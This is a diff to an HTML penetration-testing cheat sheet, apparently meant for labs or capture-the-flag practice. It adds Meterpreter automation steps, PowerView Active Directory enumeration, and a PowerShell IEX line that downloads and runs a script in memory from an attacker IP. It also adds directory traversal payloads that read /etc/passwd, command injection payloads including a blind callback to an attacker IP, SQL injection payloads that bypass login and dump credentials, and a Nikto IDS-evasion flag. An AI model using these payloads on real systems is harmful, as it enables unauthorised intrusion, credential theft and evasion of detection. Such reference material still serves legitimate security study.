@@ -409,52 +409,48 @@ setg Proxies socks5:127.0.0.1:9050</div>
       </div>
     </div>
 
-     <div class="setup-block">
-          <div class="setup-title">📡 Scanline </div>
-          <div class="setup-body">
-            <div class="setup-step">
-              <div class="step-num">1</div>
-              <div class="step-body">
-                <div class="step-text">Find sl.exe on your attack platform</div>
-                <div class="step-cmd">locate sl.exe</div>
-              </div>
-            </div>
-             <div class="setup-step">
-              <div class="step-num">2</div>
-              <div class="step-body">
-                <div class="step-text">Move sl.exe to your current directory to simplify the meterpreter upload command</div>
-                <div class="step-cmd">mv &lt;filepath to sl.exe&gt; .
-              </div>
-            </div>
+    <div class="setup-block">
+      <div class="setup-title">📡 Scanline</div>
+      <div class="setup-body">
+        <div class="setup-step">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <div class="step-text">Find sl.exe on your attack platform</div>
+            <div class="step-cmd">locate sl.exe</div>
+          </div>
+        </div>
+        <div class="setup-step">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <div class="step-text">Move sl.exe to your current directory to simplify the meterpreter upload command</div>
+            <div class="step-cmd">mv &lt;filepath to sl.exe&gt; .</div>
           </div>
         </div>
       </div>
     </div>
 
-  <div class="setup-block">
-          <div class="setup-title">⚙️ Automate Meterpreter Sessions (Optional)</div>
-          <div class="setup-body">
-            <div class="setup-step">
-              <div class="step-num">1</div>
-              <div class="step-body">
-                <div class="step-text"> Create a file on your attack platform and give it full permissions </div>
-                <div class="step-cmd"> touch &lt;filename&gt; <br> chmod 777 &lt;filename&gt; </div>
-              </div>
-            </div>
-             <div class="setup-step">
-              <div class="step-num">2</div>
-              <div class="step-body">
-                <div class="step-text">Identify the meterpreter commands you'd like to run when a session is established and add to them to the newly created file each on a separate line (Common ones are in the example provided below)</div>
-                <div class="step-cmd"> getsystem <br> sysinfo <br> getuid <br> getpid <br> ipconfig <br> netstat <br> </div>
-              </div>
-            </div>
-              <div class="setup-step">
-                <div class="step-num">3</div>
-                <div class="step-body">
-                  <div class="step-text">Open msfconsole and run the following command:</div>
-                  <div class="step-cmd">&lt;set&gt; or &lt;setg&gt; AutoRunScript &lt;path to file you created&gt;</div>
-              </div>
-            </div>
+    <div class="setup-block">
+      <div class="setup-title">⚙️ Automate Meterpreter Sessions (Optional)</div>
+      <div class="setup-body">
+        <div class="setup-step">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <div class="step-text">Create a file on your attack platform and give it full permissions</div>
+            <div class="step-cmd">touch &lt;filename&gt; <br> chmod 777 &lt;filename&gt;</div>
+          </div>
+        </div>
+        <div class="setup-step">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <div class="step-text">Identify the meterpreter commands you'd like to run when a session is established and add them to the newly created file, each on a separate line (common ones are in the example below)</div>
+            <div class="step-cmd">getsystem <br> sysinfo <br> getuid <br> getpid <br> ipconfig <br> netstat</div>
+          </div>
+        </div>
+        <div class="setup-step">
+          <div class="step-num">3</div>
+          <div class="step-body">
+            <div class="step-text">Open msfconsole and run the following command:</div>
+            <div class="step-cmd">&lt;set&gt; or &lt;setg&gt; AutoRunScript &lt;path to file you created&gt;</div>
           </div>
         </div>
       </div>
@@ -538,6 +534,80 @@ setg Proxies socks5:127.0.0.1:9050</div>
           <tr><td class="c1">dir /r</td><td class="c2">Windows: reveal Alternate Data Streams (ADS)</td><td class="c3">dir /r C:\suspect_file</td></tr>
           <tr><td class="c1">gobuster / dirb</td><td class="c2">Web: brute-force hidden directories/files</td><td class="c3">gobuster dir -u http://target -w wordlist.txt</td></tr>
         </table>
+      </div>
+
+      <div class="cmd-block">
+        <div class="cmd-block-header hdr-red"><span class="icon">🕵️</span>PowerView — AD enumeration</div>
+        <table class="cmd-table">
+          <tr><td class="c1">load powershell</td><td class="c2">Meterpreter: load the PowerShell extension</td><td class="c3">meterpreter &gt; load powershell</td></tr>
+          <tr><td class="c1">powershell_import</td><td class="c2">Meterpreter: import PowerView.ps1 into the session</td><td class="c3">powershell_import /path/PowerView.ps1</td></tr>
+          <tr><td class="c1">powershell_shell</td><td class="c2">Meterpreter: drop into an interactive PS shell to run PowerView cmdlets</td><td class="c3">powershell_shell</td></tr>
+          <tr><td class="c1">powershell_execute</td><td class="c2">Meterpreter: run a single PowerView cmdlet non-interactively</td><td class="c3">powershell_execute "Get-NetDomain"</td></tr>
+          <tr><td class="c1">IEX (non-meterpreter)</td><td class="c2">Download &amp; load PowerView in-memory from a plain PS prompt</td><td class="c3">IEX (New-Object Net.WebClient).DownloadString('http://&lt;ip&gt;/PowerView.ps1')</td></tr>
+        </table>
+      </div>
+
+      <div class="ref-wrap">
+        <div class="ref-wrap-title">PowerView — useful cmdlets</div>
+        <table class="ref-table">
+          <thead><tr><th>Cmdlet</th><th>What it does</th></tr></thead>
+          <tbody>
+            <tr><td class="fp">Get-NetDomain</td><td class="fd">Basic info about the current domain</td></tr>
+            <tr><td class="fp">Get-NetUser</td><td class="fd">List all domain user objects</td></tr>
+            <tr><td class="fp">Get-NetGroup</td><td class="fd">List domain groups</td></tr>
+            <tr><td class="fp">Get-NetGroupMember -GroupName "Domain Admins"</td><td class="fd">List members of a specific group</td></tr>
+            <tr><td class="fp">Get-NetComputer</td><td class="fd">List domain-joined computers</td></tr>
+            <tr><td class="fp">Get-NetOU</td><td class="fd">List Organizational Units</td></tr>
+            <tr><td class="fp">Get-NetGPO</td><td class="fd">List Group Policy Objects</td></tr>
+            <tr><td class="fp">Get-NetDomainController</td><td class="fd">List domain controllers</td></tr>
+            <tr><td class="fp">Get-NetSession -ComputerName &lt;host&gt;</td><td class="fd">List active sessions on a remote computer</td></tr>
+            <tr><td class="fp">Get-NetLoggedon -ComputerName &lt;host&gt;</td><td class="fd">List users currently logged on to a host</td></tr>
+            <tr><td class="fp">Find-LocalAdminAccess</td><td class="fd">Find machines where your current user has local admin</td></tr>
+            <tr><td class="fp">Get-NetDomainTrust</td><td class="fd">Map domain trust relationships</td></tr>
+            <tr><td class="fp">Invoke-ShareFinder</td><td class="fd">Find accessible shares across the domain</td></tr>
+            <tr><td class="fp">Get-DomainUser -SPN</td><td class="fd">Find users with an SPN set — Kerberoasting targets</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="cmd-block">
+        <div class="cmd-block-header hdr-red"><span class="icon">🌐</span>DirBuster &amp; Nikto — web enumeration</div>
+        <table class="cmd-table">
+          <tr><td class="c1">-H</td><td class="c2">DirBuster: run headless (CLI, no GUI)</td><td class="c3">dirbuster -H -u http://target -l wordlist.txt</td></tr>
+          <tr><td class="c1">-u &lt;url&gt;</td><td class="c2">DirBuster: target URL</td><td class="c3">-u http://target</td></tr>
+          <tr><td class="c1">-l &lt;wordlist&gt;</td><td class="c2">DirBuster: wordlist file to brute-force with</td><td class="c3">-l /usr/share/wordlists/dirbuster/common.txt</td></tr>
+          <tr><td class="c1">-e &lt;ext&gt;</td><td class="c2">DirBuster: file extensions to check</td><td class="c3">-e php,asp,html,txt</td></tr>
+          <tr><td class="c1">-t &lt;n&gt;</td><td class="c2">DirBuster: thread count</td><td class="c3">-t 50</td></tr>
+          <tr><td class="c1">-r</td><td class="c2">DirBuster: recursive scan into found directories</td><td class="c3">-r</td></tr>
+          <tr><td class="c1">-o &lt;file&gt;</td><td class="c2">DirBuster: write results to a report file</td><td class="c3">-o dirbuster_report.txt</td></tr>
+        </table>
+        <div style="padding: 0 12px 12px;">
+          <div class="callout callout-info" style="margin-bottom:0;">
+            <span class="callout-icon">ℹ</span>
+            <div>DirBuster is primarily a GUI tool — target URL, wordlist, thread count, extensions, and recursive toggle are all set in the GUI panel if you're not running headless mode.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="flag-block">
+        <div class="ref-wrap-title">Nikto — key flags</div>
+        <table class="flag-table">
+          <thead><tr><th>Flag</th><th>Purpose</th></tr></thead>
+          <tbody>
+            <tr><td class="flg">-h &lt;target&gt;</td><td class="fd">Target host/URL</td></tr>
+            <tr><td class="flg">-p &lt;port&gt;</td><td class="fd">Target port (default 80)</td></tr>
+            <tr><td class="flg">-ssl</td><td class="fd">Force SSL/TLS on the target</td></tr>
+            <tr><td class="flg">-o &lt;file&gt;</td><td class="fd">Write results to a file</td></tr>
+            <tr><td class="flg">-Format &lt;type&gt;</td><td class="fd">Output format — htm, csv, txt, xml</td></tr>
+            <tr><td class="flg">-Tuning &lt;n&gt;</td><td class="fd">Limit scan to specific test categories</td></tr>
+            <tr><td class="flg">-evasion &lt;n&gt;</td><td class="fd">IDS evasion technique to apply</td></tr>
+            <tr><td class="flg">-vhost &lt;name&gt;</td><td class="fd">Set a virtual host header for name-based hosting</td></tr>
+            <tr><td class="flg">-timeout &lt;n&gt;</td><td class="fd">Request timeout in seconds</td></tr>
+          </tbody>
+        </table>
+        <div style="padding: 8px 14px 12px;">
+          <div class="step-cmd">nikto -h http://target -o nikto_report.html -Format htm</div>
+        </div>
       </div>
     </div>
 
@@ -637,8 +707,6 @@ setg Proxies socks5:127.0.0.1:9050</div>
         <span class="callout-icon">ℹ</span>
         <div>When migrating, look for a process running as NTAUTHORITY/SYSTEM to gain the highest level of local privileges and ensure stability.</div>
       </div>
-    </div>
-            
 
       <div class="divider"></div>
 
@@ -763,6 +831,63 @@ setg Proxies socks5:127.0.0.1:9050</div>
           <div class="callout callout-warn" style="margin-bottom:0;">
             <span class="callout-icon">⚠</span>
             <div>Set a matching listener (<code>exploit/multi/handler</code> with the same payload/LHOST/LPORT) before executing the payload on target, or the callback has nothing to connect to.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="divider"></div>
+
+      <div class="cmd-block">
+        <div class="cmd-block-header hdr-red"><span class="icon">📁</span>Web exploitation — directory traversal</div>
+        <table class="cmd-table">
+          <tr><td class="c1">../../../etc/passwd</td><td class="c2">Basic Linux traversal from a vulnerable file parameter</td><td class="c3">?file=../../../etc/passwd</td></tr>
+          <tr><td class="c1">..\..\..\windows\win.ini</td><td class="c2">Basic Windows traversal</td><td class="c3">?file=..\..\..\windows\win.ini</td></tr>
+          <tr><td class="c1">..%2f..%2f..%2f</td><td class="c2">URL-encoded traversal — bypasses naive filters</td><td class="c3">?file=..%2f..%2f..%2fetc%2fpasswd</td></tr>
+          <tr><td class="c1">....//....//</td><td class="c2">Doubled-up dots — bypasses filters that strip "../" once</td><td class="c3">?file=....//....//etc/passwd</td></tr>
+          <tr><td class="c1">%00 (null byte)</td><td class="c2">Truncates the appended extension on older/unpatched stacks</td><td class="c3">?file=../../../etc/passwd%00</td></tr>
+        </table>
+      </div>
+
+      <div class="cmd-block">
+        <div class="cmd-block-header hdr-red"><span class="icon">💻</span>Web exploitation — command injection</div>
+        <table class="cmd-table">
+          <tr><td class="c1">; &lt;cmd&gt;</td><td class="c2">Chain a second command (Linux)</td><td class="c3">127.0.0.1; whoami</td></tr>
+          <tr><td class="c1">&amp;&amp; &lt;cmd&gt;</td><td class="c2">Run only if the first command succeeds</td><td class="c3">127.0.0.1 &amp;&amp; whoami</td></tr>
+          <tr><td class="c1">|| &lt;cmd&gt;</td><td class="c2">Run only if the first command fails</td><td class="c3">badhost || whoami</td></tr>
+          <tr><td class="c1">| &lt;cmd&gt;</td><td class="c2">Pipe output into a second command</td><td class="c3">127.0.0.1 | whoami</td></tr>
+          <tr><td class="c1">`&lt;cmd&gt;` / $(&lt;cmd&gt;)</td><td class="c2">Inline command substitution</td><td class="c3">$(whoami)</td></tr>
+          <tr><td class="c1">Blind injection</td><td class="c2">No output shown — confirm via timing or out-of-band callback</td><td class="c3">; ping -c 4 &lt;attacker_ip&gt;</td></tr>
+        </table>
+      </div>
+
+      <div class="cmd-block">
+        <div class="cmd-block-header hdr-red"><span class="icon">🗄️</span>Web exploitation — SQL injection</div>
+        <table class="cmd-table">
+          <tr><td class="c1">' OR '1'='1</td><td class="c2">Classic auth-bypass payload</td><td class="c3">username: admin' OR '1'='1</td></tr>
+          <tr><td class="c1">' OR '1'='1' --</td><td class="c2">Same, with trailing comment to drop the rest of the query</td><td class="c3">' OR '1'='1' --</td></tr>
+          <tr><td class="c1">admin'--</td><td class="c2">Comment out the password check entirely</td><td class="c3">admin'--</td></tr>
+          <tr><td class="c1">' UNION SELECT null,null--</td><td class="c2">Enumerate column count for a UNION-based injection</td><td class="c3">' UNION SELECT null,null,null--</td></tr>
+          <tr><td class="c1">' UNION SELECT user,password FROM users--</td><td class="c2">Pull data once column count/types are known</td><td class="c3">' UNION SELECT username,password FROM users--</td></tr>
+          <tr><td class="c1">' AND SLEEP(5)--</td><td class="c2">Time-based blind test — confirms injection without visible output</td><td class="c3">' AND SLEEP(5)--</td></tr>
+          <tr><td class="c1">' AND 1=1-- / ' AND 1=2--</td><td class="c2">Boolean-based blind test — compare page responses</td><td class="c3">' AND 1=1--</td></tr>
+          <tr><td class="c1">sqlmap</td><td class="c2">Automate detection &amp; extraction once you've confirmed injection manually</td><td class="c3">sqlmap -u "http://target/page?id=1" --dbs</td></tr>
+        </table>
+      </div>
+
+      <div class="cmd-block">
+        <div class="cmd-block-header hdr-red"><span class="icon">🔍</span>Viewing page/source code</div>
+        <table class="cmd-table">
+          <tr><td class="c1">Ctrl+U</td><td class="c2">View rendered page's HTML source (browser)</td><td class="c3">Ctrl+U</td></tr>
+          <tr><td class="c1">F12</td><td class="c2">Open browser DevTools — inspect elements, network, JS</td><td class="c3">F12</td></tr>
+          <tr><td class="c1">view-source:</td><td class="c2">Address bar prefix to force source view</td><td class="c3">view-source:http://target</td></tr>
+          <tr><td class="c1">curl -s &lt;url&gt;</td><td class="c2">Pull raw HTML from the command line</td><td class="c3">curl -s http://target | less</td></tr>
+          <tr><td class="c1">/robots.txt</td><td class="c2">Check for disallowed paths that hint at hidden content</td><td class="c3">http://target/robots.txt</td></tr>
+          <tr><td class="c1">/sitemap.xml</td><td class="c2">Check for a full site map of indexed pages</td><td class="c3">http://target/sitemap.xml</td></tr>
+        </table>
+        <div style="padding: 0 12px 12px;">
+          <div class="callout callout-tip" style="margin-bottom:0;">
+            <span class="callout-icon">💡</span>
+            <div>Don't just read the HTML — check linked JS files too. Hardcoded API keys, hidden endpoints, and debug comments frequently end up in client-side JavaScript rather than the page itself.</div>
           </div>
         </div>
       </div>
